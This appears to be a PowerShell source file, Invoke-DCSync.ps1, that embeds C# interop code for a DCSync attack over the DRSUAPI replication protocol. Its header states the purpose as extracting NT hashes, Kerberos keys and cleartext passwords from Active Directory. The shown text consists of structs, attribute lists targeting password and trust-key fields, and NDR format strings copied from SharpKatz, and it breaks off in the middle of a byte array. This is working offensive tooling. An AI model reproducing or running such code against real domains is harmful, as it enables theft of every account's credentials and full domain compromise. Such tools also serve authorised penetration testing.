# Invoke-DCSync.ps1
# DCSync implementation using DRSUAPI RPC protocol
# Replicates AD objects to extract credential material (NT hashes, Kerberos keys, cleartext passwords)
#
# ============================================================================
# Embedded C# class for RPC/NDR/DRSUAPI interop
# ============================================================================

$Script:DCSyncCode = @'
using System;
using System.Collections.Generic;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace adPEAS
{
    #region Result Classes
    public class DCSyncResult
    {
        public bool Success;
        public string Error;
        public DCSyncUserData[] Users;
    }

    public class DCSyncUserData
    {
        public string SAMAccountName;
        public string UserPrincipalName;
        public string DisplayName;
        public byte[] ObjectSID;
        public int UserAccountControl;
        public int SAMAccountType;
        public long PwdLastSet;
        public long AccountExpires;
        public byte[] UnicodePassword;
        public byte[] NTPasswordHistory;
        public byte[] LMPassword;
        public byte[] LMPasswordHistory;
        public byte[] SupplementalCredentials;
        public string ServicePrincipalName;
        public byte[] SIDHistory;
    }
    #endregion

    #region Structs
    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_EXTENSIONS_INT
    {
        public UInt32 cb;
        public UInt32 dwFlags;
        public Guid SiteObjGuid;
        public UInt32 Pid;
        public UInt32 dwReplEpoch;
        public UInt32 dwFlagsExt;
        public Guid ConfigObjGUID;
        public UInt32 dwExtCaps;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_DCINFOREQ_V1
    {
        public IntPtr Domain;
        public UInt32 InfoLevel;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_DCINFOREPLY_V2
    {
        public UInt32 cItems;
        public IntPtr rItems;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DS_DOMAIN_CONTROLLER_INFO_2W
    {
        public IntPtr NetbiosName;
        public IntPtr DnsHostName;
        public IntPtr SiteName;
        public IntPtr SiteObjectName;
        public IntPtr ComputerObjectName;
        public IntPtr ServerObjectName;
        public IntPtr NtdsDsaObjectName;
        public UInt32 fIsPdc;
        public UInt32 fDsEnabled;
        public UInt32 fIsGc;
        public Guid SiteObjectGuid;
        public Guid ComputerObjectGuid;
        public Guid ServerObjectGuid;
        public Guid NtdsDsaObjectGuid;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct USN_VECTOR
    {
        public long usnHighObjUpdate;
        public long usnReserved;
        public long usnHighPropUpdate;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SCHEMA_PREFIX_TABLE
    {
        public UInt32 PrefixCount;
        public IntPtr pPrefixEntry;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DSNAME
    {
        public UInt32 structLen;
        public UInt32 SidLen;
        public Guid Guid;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 28)]
        public byte[] Sid;
        public UInt32 NameLen;
        public byte StringName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_GETCHGREQ_V8
    {
        public Guid uuidDsaObjDest;
        public Guid uuidInvocIdSrc;
        public IntPtr pNC;
        public USN_VECTOR usnvecFrom;
        public IntPtr pUpToDateVecDest;
        public UInt32 ulFlags;
        public UInt32 cMaxObjects;
        public UInt32 cMaxBytes;
        public UInt32 ulExtendedOp;
        public ulong liFsmoInfo;
        public IntPtr pPartialAttrSet;
        public IntPtr pPartialAttrSetEx;
        public SCHEMA_PREFIX_TABLE PrefixTableDest;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_GETCHGREPLY_V6
    {
        public Guid uuidDsaObjSrc;
        public Guid uuidInvocIdSrc;
        public IntPtr pNC;
        public USN_VECTOR usnvecFrom;
        public USN_VECTOR usnvecTo;
        public IntPtr pUpToDateVecSrc;
        public SCHEMA_PREFIX_TABLE PrefixTableSrc;
        public UInt32 ulExtendedRet;
        public UInt32 cNumObjects;
        public UInt32 cNumBytes;
        public IntPtr pObjects;
        public UInt32 fMoreData;
        public UInt32 cNumNcSizeObjects;
        public UInt32 cNumNcSizeValues;
        public UInt32 cNumValues;
        public IntPtr rgValues;
        public UInt32 dwDRSError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_CRACKREQ_V1
    {
        public UInt32 CodePage;
        public UInt32 LocaleId;
        public UInt32 dwFlags;
        public UInt32 formatOffered;
        public UInt32 formatDesired;
        public UInt32 cNames;
        public IntPtr rpNames;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DS_NAME_RESULT_ITEMW
    {
        public UInt32 status;
        public IntPtr pDomain;
        public IntPtr pName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DS_NAME_RESULTW
    {
        public UInt32 cItems;
        public IntPtr rItems;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ATTRVAL
    {
        public UInt32 valLen;
        public IntPtr pVal;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ATTRVALBLOCK
    {
        public UInt32 valCount;
        public IntPtr pAVal;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ATTR
    {
        public UInt32 attrTyp;
        public ATTRVALBLOCK AttrVal;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ATTRBLOCK
    {
        public UInt32 attrCount;
        public IntPtr pAttr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ENTINF
    {
        public IntPtr pName;
        public UInt32 ulFlags;
        public ATTRBLOCK AttrBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct REPLENTINFLIST
    {
        public IntPtr pNextEntInf;
        public ENTINF Entinf;
        public UInt32 fIsNCPrefix;
        public IntPtr pParentGuid;
        public IntPtr pMetaDataExt;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PARTIAL_ATTR_VECTOR_V1_EXT
    {
        public uint dwVersion;
        public uint dwReserved1;
        public uint cAttrs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 19)]
        public uint[] rgPartialAttr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PrefixTableEntry
    {
        public uint ndx;
        public OID_t prefix;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OID_t
    {
        public uint length;
        public IntPtr elements;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RPC_SECURITY_QOS
    {
        public uint Version;
        public uint Capabilities;
        public uint IdentityTracking;
        public uint ImpersonationType;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecPkgContext_SessionKey
    {
        public uint SessionKeyLength;
        public IntPtr SessionKey;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CRYPTO_BUFFER
    {
        public uint Length;
        public uint MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MIDL_STUB_DESC
    {
        public IntPtr RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr apfnNdrRundownRoutines;
        public IntPtr aGenericBindingRoutinePairs;
        public IntPtr apfnExprEval;
        public IntPtr aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        public uint Version;
        public IntPtr pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        public IntPtr aUserMarshalQuadruple;
        public IntPtr NotifyRoutineTable;
        public IntPtr mFlags;
        public IntPtr CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr pExprInfo;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SEC_WINNT_AUTH_IDENTITY_W
    {
        public string User;
        public int UserLength;
        public string Domain;
        public int DomainLength;
        public string Password;
        public int PasswordLength;
        public int Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OssEncodedOID
    {
        public ushort length;
        public IntPtr value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ASN1encoding_s
    {
        public uint magic;
        public uint version;
        public IntPtr module;
        IntPtr buf;
        uint size;
        uint len;
        int err;
        uint bit;
        IntPtr pos;
        uint cbExtraHeader;
        int eRule;
        uint dwFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ASN1decoding_s
    {
        uint magic;
        uint version;
        IntPtr module;
        IntPtr buf;
        uint size;
        uint len;
        int err;
        uint bit;
        IntPtr pos;
        int eRule;
        uint dwFlags;
    }
    #endregion

    #region ATT Enum
    public enum ATT
    {
        ATT_WHEN_CREATED = 131074,
        ATT_WHEN_CHANGED = 131075,
        ATT_RDN = 589825,
        ATT_OBJECT_SID = 589970,
        ATT_SAM_ACCOUNT_NAME = 590045,
        ATT_USER_PRINCIPAL_NAME = 590480,
        ATT_SERVICE_PRINCIPAL_NAME = 590595,
        ATT_SID_HISTORY = 590433,
        ATT_USER_ACCOUNT_CONTROL = 589832,
        ATT_SAM_ACCOUNT_TYPE = 590126,
        ATT_PWD_LAST_SET = 589920,
        ATT_ACCOUNT_EXPIRES = 589983,
        ATT_UNICODE_PWD = 589914,
        ATT_NT_PWD_HISTORY = 589918,
        ATT_DBCS_PWD = 589879,
        ATT_LM_PWD_HISTORY = 589984,
        ATT_SUPPLEMENTAL_CREDENTIALS = 589949,
        ATT_CURRENT_VALUE = 589851,
        ATT_TRUST_AUTH_INCOMING = 589953,
        ATT_TRUST_AUTH_OUTGOING = 589959,
        ATT_TRUST_PARTNER = 589957,
    }
    #endregion

    public class DCSyncInterop
    {
        #region Constants
        const int DRS_INIT_SYNC = 0x00000020;
        const int DRS_WRIT_REP = 0x00000010;
        const int DRS_NEVER_SYNCED = 0x00200000;
        const int DRS_FULL_SYNC_NOW = 0x00008000;
        const int DRS_SYNC_URGENT = 0x00080000;

        const uint DRS_EXT_BASE = 0x00000001;
        const uint DRS_EXT_ASYNCREPL = 0x00000002;
        const uint DRS_EXT_REMOVEAPI = 0x00000004;
        const uint DRS_EXT_MOVEREQ_V2 = 0x00000008;
        const uint DRS_EXT_GETCHG_DEFLATE = 0x00000010;
        const uint DRS_EXT_DCINFO_V1 = 0x00000020;
        const uint DRS_EXT_RESTORE_USN_OPTIMIZATION = 0x00000040;
        const uint DRS_EXT_ADDENTRY = 0x00000080;
        const uint DRS_EXT_KCC_EXECUTE = 0x00000100;
        const uint DRS_EXT_ADDENTRY_V2 = 0x00000200;
        const uint DRS_EXT_LINKED_VALUE_REPLICATION = 0x00000400;
        const uint DRS_EXT_DCINFO_V2 = 0x00000800;
        const uint DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD = 0x00001000;
        const uint DRS_EXT_CRYPTO_BIND = 0x00002000;
        const uint DRS_EXT_GET_REPL_INFO = 0x00004000;
        const uint DRS_EXT_STRONG_ENCRYPTION = 0x00008000;
        const uint DRS_EXT_DCINFO_VFFFFFFFF = 0x00010000;
        const uint DRS_EXT_TRANSITIVE_MEMBERSHIP = 0x00020000;
        const uint DRS_EXT_ADD_SID_HISTORY = 0x00040000;
        const uint DRS_EXT_POST_BETA3 = 0x00080000;
        const uint DRS_EXT_GETCHGREQ_V5 = 0x00100000;
        const uint DRS_EXT_GETMEMBERSHIPS2 = 0x00200000;
        const uint DRS_EXT_GETCHGREQ_V6 = 0x00400000;
        const uint DRS_EXT_NONDOMAIN_NCS = 0x00800000;
        const uint DRS_EXT_GETCHGREQ_V8 = 0x01000000;
        const uint DRS_EXT_GETCHGREPLY_V5 = 0x02000000;
        const uint DRS_EXT_GETCHGREPLY_V6 = 0x04000000;
        const uint DRS_EXT_WHISTLER_BETA3 = 0x08000000;
        const uint DRS_EXT_W2K3_DEFLATE = 0x10000000;
        const uint DRS_EXT_GETCHGREQ_V10 = 0x20000000;

        static readonly uint ALL_EXT = DRS_EXT_BASE + DRS_EXT_CRYPTO_BIND + DRS_EXT_STRONG_ENCRYPTION +
            DRS_EXT_ASYNCREPL + DRS_EXT_REMOVEAPI + DRS_EXT_MOVEREQ_V2 + DRS_EXT_GETCHG_DEFLATE +
            DRS_EXT_DCINFO_V1 + DRS_EXT_RESTORE_USN_OPTIMIZATION + DRS_EXT_ADDENTRY +
            DRS_EXT_KCC_EXECUTE + DRS_EXT_ADDENTRY_V2 + DRS_EXT_LINKED_VALUE_REPLICATION +
            DRS_EXT_DCINFO_V2 + DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD + DRS_EXT_GET_REPL_INFO +
            DRS_EXT_DCINFO_VFFFFFFFF + DRS_EXT_TRANSITIVE_MEMBERSHIP + DRS_EXT_ADD_SID_HISTORY +
            DRS_EXT_POST_BETA3 + DRS_EXT_GETCHGREQ_V5 + DRS_EXT_GETMEMBERSHIPS2 +
            DRS_EXT_GETCHGREQ_V6 + DRS_EXT_NONDOMAIN_NCS + DRS_EXT_GETCHGREQ_V8 +
            DRS_EXT_GETCHGREPLY_V5 + DRS_EXT_GETCHGREPLY_V6 + DRS_EXT_WHISTLER_BETA3 +
            DRS_EXT_W2K3_DEFLATE + DRS_EXT_GETCHGREQ_V10;

        const int DRS_EXT_LH_BETA2 = 0x00000002;
        const int DRS_EXT_RECYCLE_BIN = 0x00000004;
        const int DRS_EXT_PAM = 0x00000200;

        const int RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
        const int RPC_C_OPT_SECURITY_CALLBACK = 10;
        const uint RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH = 0x1;
        const int SECPKG_ATTR_SESSION_KEY = 9;

        public const int RPC_C_AUTHN_WINNT = 10;
        public const int RPC_C_AUTHN_GSS_NEGOTIATE = 9;
        #endregion

        #region OIDs
        static string[] oids = {
            "1.2.840.113556.1.4.1",     // name
            "1.2.840.113556.1.4.221",   // sAMAccountName
            "1.2.840.113556.1.4.656",   // userPrincipalName
            "1.2.840.113556.1.4.302",   // sAMAccountType
            "1.2.840.113556.1.4.8",     // userAccountControl
            "1.2.840.113556.1.4.159",   // accountExpires
            "1.2.840.113556.1.4.96",    // pwdLastSet
            "1.2.840.113556.1.4.146",   // objectSid
            "1.2.840.113556.1.4.609",   // sIDHistory
            "1.2.840.113556.1.4.90",    // unicodePwd
            "1.2.840.113556.1.4.94",    // ntPwdHistory
            "1.2.840.113556.1.4.55",    // dBCSPwd
            "1.2.840.113556.1.4.160",   // lmPwdHistory
            "1.2.840.113556.1.4.125",   // supplementalCredentials
            "1.2.840.113556.1.4.133",   // trustPartner
            "1.2.840.113556.1.4.129",   // trustAuthIncoming
            "1.2.840.113556.1.4.135",   // trustAuthOutgoing
            "1.2.840.113556.1.4.27",    // currentValue
            "1.2.840.113556.1.2.48",    // isDeleted
        };
        #endregion

        #region NDR Format Strings (MIDL-generated, verbatim from SharpKatz)
        static byte[] ms2Ddrsr__MIDL_ProcFormatString = new byte[] {
            0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x30,0x00,0x32,0x00,0x00,0x00,0x44,0x00,0x40,0x00,0x47,0x05,0x0a,0x07,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,
            0x08,0x00,0x78,0x03,0x0b,0x00,0x10,0x00,0x7c,0x03,0x13,0x20,0x18,0x00,0xa4,0x03,0x10,0x01,0x20,0x00,0xac,0x03,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
            0x00,0x00,0x01,0x00,0x10,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x01,0x00,0x00,
            0xb4,0x03,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x03,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x07,0x01,0x00,
            0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0xc0,0x03,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x01,
            0x20,0x00,0x74,0x04,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x04,0x00,0x20,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x08,0x00,0x46,0x04,
            0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0x8e,0x04,0x70,0x00,0x18,0x00,
            0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x20,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x08,0x00,0x46,0x04,0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,
            0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0xc2,0x04,0x70,0x00,0x18,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
            0x06,0x00,0x20,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x08,0x00,0x46,0x04,0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,
            0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0x04,0x05,0x70,0x00,0x18,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x07,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,
            0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x07,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,
            0x34,0x05,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x81,0x20,0x00,0x8a,0x05,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x08,0x00,0x32,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,
            0x24,0x00,0x47,0x06,0x0a,0x07,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0xdc,0x05,
            0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x21,0x20,0x00,0x2e,0x06,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x10,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,
            0x47,0x06,0x0a,0x07,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0x48,0x06,0x50,0x21,
            0x18,0x00,0x08,0x00,0x13,0x41,0x20,0x00,0x72,0x06,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x11,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,
            0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x07,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0xb8,0x03,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,
            0x8c,0x06,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0xa1,0x20,0x00,0xc6,0x06,0x70,0x00,0x28,0x00,0x08,0x00,0x00
        };

        static byte[] ms2Ddrsr__MIDL_TypeFormatString = new byte[] {
            0x00,0x00,0x1d,0x00,0x08,0x00,0x01,0x5b,0x15,0x03,0x10,0x00,0x08,0x06,0x06,0x4c,0x00,0xf1,0xff,0x5b,0x15,0x07,0x18,0x00,0x0b,0x0b,0x0b,0x5b,0xb7,0x08,0x00,0x00,
            0x00,0x00,0x00,0x00,0x10,0x00,0xb7,0x08,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x02,0x5b,0x1a,0x03,0x10,0x00,
            0x00,0x00,0x0a,0x00,0x4c,0x00,0xe0,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0xe2,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x4c,0x00,0xe0,0xff,0x5c,0x5b,
            0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x0a,0x00,0x4c,0x00,
            0x9c,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0xd8,0xff,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x1d,0x00,0x1c,0x00,0x02,0x5b,0x15,0x00,0x1c,0x00,0x4c,0x00,
            0xf4,0xff,0x5c,0x5b,0x1b,0x01,0x02,0x00,0x09,0x57,0xfc,0xff,0x01,0x00,0x05,0x5b,0x17,0x03,0x38,0x00,0xf0,0xff,0x08,0x08,0x4c,0x00,0x4e,0xff,0x4c,0x00,0xdc,0xff,
            0x08,0x5b,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x15,0x07,0x20,0x00,0x4c,0x00,0x36,0xff,0x0b,0x0b,0x5c,0x5b,0x1b,0x07,0x20,0x00,0x09,0x00,0xf8,0xff,
            0x01,0x00,0x4c,0x00,0xe8,0xff,0x5c,0x5b,0x1a,0x07,0x10,0x00,0xec,0xff,0x00,0x00,0x08,0x08,0x4c,0x00,0xce,0xff,0x08,0x5b,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
            0x10,0x00,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x00,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0x01,0x1a,0x03,0x10,0x00,0x00,0x00,0x0a,0x00,0x4c,0x00,
            0xec,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0x08,0xff,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xda,0xff,0x5c,0x5b,
            0x1a,0x03,0x10,0x00,0x00,0x00,0x0a,0x00,0x4c,0x00,0xb8,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0xd8,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x4c,0x00,
            0xe0,0xff,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,
            0x0a,0x00,0x4c,0x00,0x74,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0xd8,0xff,0x1a,0x03,0x20,0x00,0x00,0x00,0x0a,0x00,0x36,0x08,0x40,0x4c,0x00,0xdf,0xff,0x5b,0x12,0x00,
            0x10,0xff,0xb7,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x15,0x07,0x28,0x00,0x08,0x40,0x0b,0x4c,0x00,0x53,0xfe,0x0b,0x5c,0x5b,0x1b,0x07,0x28,0x00,0x09,0x00,
            0xf8,0xff,0x01,0x00,0x4c,0x00,0xe6,0xff,0x5c,0x5b,0x1a,0x07,0x08,0x00,0xec,0xff,0x00,0x00,0x4c,0x00,0xce,0xff,0x40,0x5b,0x1a,0x03,0x40,0x00,0x00,0x00,0x0c,0x00,
            0x36,0x4c,0x00,0xab,0xff,0x08,0x40,0x36,0x36,0x5b,0x12,0x00,0xec,0xff,0x12,0x00,0x18,0xfe,0x12,0x00,0xd6,0xff,0x15,0x07,0x30,0x00,0x0b,0x4c,0x00,0xaf,0xff,0x5b,
            0x1a,0x07,0x58,0x00,0x00,0x00,0x10,0x00,0x36,0x08,0x40,0x4c,0x00,0x09,0xff,0x08,0x40,0x4c,0x00,0xe3,0xff,0x5b,0x12,0x00,0x98,0xfe,0x21,0x07,0x00,0x00,0x19,0x00,
            0x94,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xd4,0xff,0x5c,0x5b,0x1a,0x07,0xa8,0x00,0x00,0x00,0x28,0x00,0x4c,0x00,0xce,0xfd,0x4c,0x00,0xca,0xfd,
            0x36,0x4c,0x00,0xd1,0xfd,0x4c,0x00,0xcd,0xfd,0x36,0x4c,0x00,0x2a,0xfe,0x08,0x08,0x08,0x40,0x36,0x08,0x08,0x08,0x4c,0x00,0x32,0xfe,0x36,0x08,0x40,0x5b,0x12,0x00,
            0x50,0xfe,0x12,0x00,0x84,0xfe,0x12,0x00,0x70,0xff,0x12,0x00,0xae,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x08,0x00,0x08,0x40,0x36,0x36,0x5c,0x5b,0x12,0x08,0x25,0x5c,
            0x12,0x08,0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xd8,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,
            0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x00,0xdc,0xff,0x1a,0x03,0x08,0x00,0x00,0x00,0x04,0x00,0x36,0x5b,0x12,0x00,0xe4,0xff,0xb7,0x08,0x00,0x00,0x00,0x00,0x10,0x27,
            0x00,0x00,0x1a,0x03,0x88,0x00,0x00,0x00,0x1e,0x00,0x36,0x36,0x36,0x36,0x36,0x36,0x36,0x08,0x08,0x08,0x4c,0x00,0x32,0xfd,0x4c,0x00,0x2e,0xfd,0x4c,0x00,0x2a,0xfd,
            0x4c,0x00,0x26,0xfd,0x40,0x5b,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,0x25,0x5c,0x12,0x08,
            0x25,0x5c,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xae,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x0a,0x00,
            0x4c,0x00,0x96,0xff,0x40,0x36,0x5c,0x5b,0x12,0x00,0xd8,0xff,0xb7,0x08,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x15,0x03,0x2c,0x00,0x4c,0x00,0xcc,0xfc,0x4c,0x00,
